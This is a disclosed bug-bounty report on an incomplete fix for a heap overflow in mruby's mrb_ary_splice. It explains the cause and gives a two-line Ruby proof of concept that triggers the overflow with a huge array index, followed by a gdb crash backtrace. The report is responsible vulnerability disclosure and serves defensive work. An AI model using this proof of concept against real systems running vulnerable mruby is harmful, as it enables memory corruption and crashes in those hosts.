# Still heap overflow in mrb_ary_splice

## Report Details
- **Report ID**: 197719
- **URL**: https://hackerone.com/reports/197719
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-12T04:51:40.576Z
- **Disclosed**: 2017-02-07T07:42:20.551Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The fix of #192362 is still crashed with a different PoC. I think the cause of this bug is the same and I missed the incomplete fix, so you may be able to skip rewards for this one.

# Cause
If I set the `tail` value to a specific value, then I can maintain the array size. [The original fix](https://github.com/ksss/mruby/commit/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0) only checks array size, but it still overwrites too many value due to the big `head` value in https://github.com/ksss/mruby/blob/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0/src/array.c#L630.

# PoC
(64bits for mrb_int)
```ruby
ary = Array.new(1024)
ary[0x7ffffffffffffc00,1024] = Array.new(1024)
```

# gdb
```
$ gdb -q --args ./bin/mruby test10.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test10.rb
1024

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361) at /home/tunz/working/mruby/mruby/src/array.c:104
104         *ptr++ = nil;
(gdb) bt
#0  0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361)
    at /home/tunz/working/mruby/mruby/src/array.c:104
#1  0x00000000004160e6 in mrb_ary_splice (mrb=0x225e010, ary=..., head=9223372036854774784, len=1024, rpl=...)
    at /home/tunz/working/mruby/mruby/src/array.c:639
#2  0x00000000004166d3 in mrb_ary_aset (mrb=0x225e010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:821
#3  0x0000000000430fd5 in mrb_vm_exec (mrb=0x225e010, proc=0x22611b0, pc=0x22c61bc) at /home/tunz/working/mruby/mruby/src/vm.c:1174
#4  0x000000000042f47b in mrb_vm_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:772
#5  0x0000000000437599 in mrb_top_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:2491
#6  0x0000000000447c47 in mrb_load_exec (mrb=0x225e010, p=0x22ba450, c=0x22b90c0)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#7  0x0000000000447cdd in mrb_load_file_cxt (mrb=0x225e010, f=0x22ba090, c=0x22b90c0)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764
#8  0x00000000004024fc in main (argc=2, argv=0x7fff6c17e5b8)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
(gdb)
```

## Attachments
No attachments
